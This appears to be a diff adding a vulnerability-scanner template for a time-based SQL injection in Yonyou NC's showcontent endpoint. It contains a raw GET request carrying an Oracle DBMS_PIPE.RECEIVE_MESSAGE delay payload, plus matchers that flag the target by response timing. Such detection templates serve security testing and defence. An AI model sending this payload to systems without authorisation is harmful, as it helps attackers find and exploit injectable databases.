@@ -1,0 +1,34 @@
+id: poc-yaml-yongyou-nc-showcontent-sqli
+info:
+  name: 用友 NC showcontent SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  metadata:
+    vendor: 用友NC
+
+variables:
+  t1: "{{rand_int(5,10)}}"
+  t2: "{{to_number(t1) + 2}}"
+
+http:
+  - raw:
+      - |
+        GET /ebvp/infopub/showcontent?id=1'+AND+1=DBMS_PIPE.RECEIVE_MESSAGE(1,{{t1}})-- HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        part: body
+        words:
+          - "/ebvp/"
+      - type: word
+        part: body
+        words:
+          - "Yonyou NC"
+      - type: dsl
+        dsl:
+          - duration > t1 && duration < t2
